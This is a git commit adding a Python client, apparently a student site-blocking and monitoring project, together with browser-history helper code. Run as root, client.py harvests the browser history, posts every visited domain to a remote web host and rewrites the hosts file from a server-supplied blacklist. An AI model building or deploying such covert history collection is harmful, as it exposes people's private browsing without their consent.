901ec32b7a09d5f294df5b7577b3bce639256cd0
PlaymakerVN <64791899+PlaymakerVN@users.noreply.github.com>
2023-12-11 11:21:48 +0700

    .

---
+++ CLIENT/COMPILE/browser_history/utils.py
@@ -0,0 +1,215 @@
+"""
+Module defines Platform class enumerates the popular Operating Systems.
+
+"""
+import os
+import enum
+import inspect
+import logging
+import platform
+import subprocess
+from typing import Optional
+
+from . import generic
+
+logger = logging.getLogger("browser-history")
+handler = logging.StreamHandler()
+formatter = logging.Formatter("%(levelname)s: %(message)s")
+handler.setFormatter(formatter)
+logger.addHandler(handler)
+logger.setLevel(logging.INFO)
+
+
+class Platform(enum.Enum):
+    """An enum used to indicate the system's platform
+
+    A value of 0 is reserved for unknown platforms.
+
+    **Usage**:
+    To be used without instantiating like so::
+
+        linux = Platform.LINUX
+        mac = Platform.MAC
+        windows = Platform.WINDOWS
+
+    See :py:func:`get_platform` to infer the platform from the system.
+    """
+
+    OTHER = 0
+    LINUX = 1
+    MAC = 2
+    WINDOWS = 3
+
+
+def get_platform():
+    """Returns the current platform
+
+    :rtype: :py:class:`Platform`
+    """
+    system = platform.system()
+    if system == "Linux":
+        return Platform.LINUX
+    if system == "Darwin":
+        return Platform.MAC
+    if system == "Windows":
+        return Platform.WINDOWS
+    raise NotImplementedError(f"Platform {system} is not supported yet")
+
+def get_platform_name(plat: Optional[Platform] = None) -> str:
+    """Returns human readable name of the current platform"""
+    if plat is None:
+        plat = get_platform()
+
+    if plat == Platform.LINUX:
+        return "Linux"
+    if plat == Platform.WINDOWS:
+        return "Windows"
+    if plat == Platform.MAC:
+        return "MacOS"
+    return "Unknown"
+
+
+def get_browsers():
+    """This method provides a list of all browsers implemented by
+    browser_history.
+
+    :return: A :py:class:`list` containing implemented browser classes
+        all inheriting from the super class
+        :py:class:`browser_history.generic.Browser`
+
+    :rtype: :py:class:`list`
+    """
+
+    # recursively get all concrete subclasses
+    def get_subclasses(browser):
+        # include browser itself in return list if it is concrete
+        sub_classes = []
+        if not inspect.isabstract(browser):
+            sub_classes.append(browser)
+
+        for sub_class in browser.__subclasses__():
+            sub_classes.extend(get_subclasses(sub_class))
+        return sub_classes
+
+    return get_subclasses(generic.Browser)
+
+
+def _default_browser_linux():
+    try:
+        cmd = "xdg-settings get default-web-browser".split()
+        raw_result = subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
+        # most have a suffix ".desktop" so just remove it
+        default = raw_result.decode().strip().lower().replace(".desktop", "")
+    except (FileNotFoundError, subprocess.CalledProcessError, PermissionError):
+        logger.warning("Could not determine default browser")
+        default = None
+
+    return default
+
+
+def _default_browser_win():
+    if get_platform() == Platform.WINDOWS:
+        try:
+            import winreg
+        except ModuleNotFoundError:
+            winreg = None
+    reg_path = (
+        "Software\\Microsoft\\Windows\\Shell\\Associations\\"
+        "UrlAssociations\\https\\UserChoice"
+    )
+    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
+        default = winreg.QueryValueEx(key, "ProgId")
+        if default is None:
+            logger.warning("Could not determine default browser")
+            return None
+        return default[0].lower()
+
+
+def default_browser():
+    """This method gets the default browser of the current platform
+
+    :return: A :py:class:`browser_history.generic.Browser` object representing the
+        default browser in the current platform. If platform is not supported or
+        default browser is unknown or unsupported ``None`` is returned
+
+    :rtype: union[:py:class:`browser_history.generic.Browser`, None]
+    """
+    plat = get_platform()
+
+    # ---- get default from specific platform ----
+
+    # Always try to return a lower-cased value for ease of comparison
+    if plat == Platform.LINUX:
+        default = _default_browser_linux()
+    elif plat == Platform.WINDOWS:
+        default = _default_browser_win()
+    else:
+        logger.warning("Default browser feature not supported on this OS")
+        return None
+
+    if default is None:
+        # the current platform has completely failed to provide a default
+        logger.warning("No default browser found")
+        return None
+
+    # ---- convert obtained default to something we understand ----
+    all_browsers = get_browsers()
+
+    # first quick pass for direct matches
+    for browser in all_browsers:
+        if default == browser.name.lower() or default in browser.aliases:
+            return browser
+
+    # separate pass for deeper matches
+    for browser in all_browsers:
+        # look for alias matches even if the default name has "noise"
+        # for instance firefox on windows returns something like
+        # "firefoxurl-3EEDF34567DDE" but we only need "firefoxurl"
+        for alias in browser.aliases:
+            if alias in default:
+                return browser
+
+    # nothing was found
+    logger.warning("Current default browser is not supported")
+    return None
+
+
+def get_browser(browser_name):
+    """
+    This method returns the browser class from a browser name.
+
+    :param browser_name: a string representing one of the browsers supported
+        or ``default`` (to fetch the default browser).
+
+    :return: A browser class which is a subclass of
+        :py:class:`browser_history.generic.Browser` otherwise ``None`` if no
+        supported browsers match the browser name given or the given browser
+        is not supported on the current platform
+
+    :rtype: union[:py:class:`browser_history.generic.Browser`, None]
+    """
+    # gets browser class by name (string).
+    if browser_name == "default":
+        return default_browser()
+    else:
+        browser_class = None
+        for browser in get_browsers():
+            if browser.__name__.lower() == browser_name.lower():
+                if browser.is_supported():
+                    browser_class = browser
+                    break
+                else:
+                    logger.error(
+                        "%s browser is not supported on %s",
+                        browser_name,
+                        get_platform_name(),
+                    )
+                    return
+
+        if browser_class is None:
+            logger.error(
+                "%s browser is unavailable. Check --help for available browsers",
+                browser_name,
+            )
+
+        return browser_class
---
+++ CLIENT/COMPILE/client.py
@@ -0,0 +1,147 @@
+#Run in Root 
+import os 
+import time
+import requests
+import json
+import socket
+import urllib.parse
+import time
+import subprocess
+
+
+from datetime import datetime as dt
+from browser_history import browsers, generic, utils,core
+
+version = "Alpha_1.1"
+# POST
+def POST(type,content):
+    r = requests.post(url=server,data={type:content})
+    # print("POST : "+content)
+def post_info():
+     r = requests.post(url=server,data={"new_connect":get_local_ip()})
+     print(r.text)
+    # POST("new_connect",utils.get_platform_name())
+def get_hosts_path():
+    plat = utils.get_platform_name()
+    #LOCATE HOSTS 
+    if plat == "Windows":
+        hosts_path = "C:\Windows\System32\drivers\etc\hosts"
+    if plat == "Linux":
+        hosts_path = "/etc/hosts"
+    print("USING "+plat+" METHOD")
+    return hosts_path
+#GET IP
+def get_local_ip():
+    hostname = socket.gethostname()
+    IPAddr = socket.gethostbyname(hostname)
+    return IPAddr
+
+
+def get_ip():
+    r = requests.post(url=server,data={'get_blacklist':'blacklist'})
+    getted_ip = r.text.split('\n')
+    return getted_ip
+#CHECK PORT OPENING
+def check_port():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    result = sock.connect_ex(('127.0.0.1',8080))
+    if result == 0:
+       print ("Port is open")
+       a=1
+    else:
+       print ("Port is not open")
+       a=0
+    sock.close()
+    return a
+#MAIN Function
+#BLOCK
+
+def block(website_list):
+    # r = requests.post(url=server,data={'text':'BLOCKED'})
+    for i in range(len(website_list)):
+        print("BLOCKED " + website_list[i])
+    #READ FILE
+    with open(hosts_path, 'r+') as file:
+        content = file.read()
+        for website in website_list:
+            if website in content:
+                pass
+            else:
+                # Apply to host
+                file.write(redirect + " " + website + "\n")
+                file.write(redirect + " " +"www."+ website + "\n")
+    pass
+
+#UNBLOCK
+def unblock():
+    r = requests.post(url=server,data={'text':'UNBLOCKED'})
+    with open(hosts_path, "r+") as file:
+        content = file.readlines()
+        file.seek(0)
+        for line in content:
+            if not any(website in line for website in website_list):
+                # Apply to host
+                file.write(line)
+                #POST
+        file.truncate()
+        print("Unblocked !!")
+    pass
+#SAVE URL HISTORY
+def solve_url_his(input_url):
+    parsed_url = urllib.parse.urlparse(input_url)
+    result = parsed_url.scheme + "://" + parsed_url.netloc
+    return result
+def post_url_his(se):
+
+    # SAVE HIS
+    domain_connected = core.get_history()
+    domain_connected.save("history_file", output_format="json")
+    f = open('history_file')
+    data = json.load(f)
+    print("SAVED HISTORY BROWSERS")
+    a=[]
+    b=[]
+    # FILTER HIS
+    dataArray=data['history']
+    POST('replace','his')
+    for i in range(len(dataArray)):
+        # b.append(solve_url_his(data['history'][i]['URL']))
+        # print(b)
+        a.append(solve_url_his(data['history'][i]['URL']))
+        # Remove duplcated
+        c= list(set(a))
+    for o in range(len(c)):
+        r=POST('his_p',c[o])
+        #LOG
+    print("HISTORY SAVED AND POSTED ", len(a) )
+
+#MCORE PROGRAMME
+
+# localhost's IP
+redirect = "127.0.0.1"
+
+#SERVER LOCATING
+
+server_local=1
+if server_local == 1:
+    server="http://localhost:8000"
+if server_local == 2:
+    server="https://khkt-lxt.000webhostapp.com/post.php"
+
+# Websites block
+# website_ban = ["anonops.com"]
+# website_cloud = get_ip()
+# website_list = website_cloud+website_ban
+# for i in range(len(website_list)):
+#     print("LIST :" + website_list[i])
+
+# c = input("Y or N:")
+hosts_path = get_hosts_path()
+post_info()
+post_url_his(server_local)
+c="y"
+while True:
+    if(c == "y" or c == "Y"):
+        block(get_ip())
+    if (c == "n" or c =="N"):
+        break
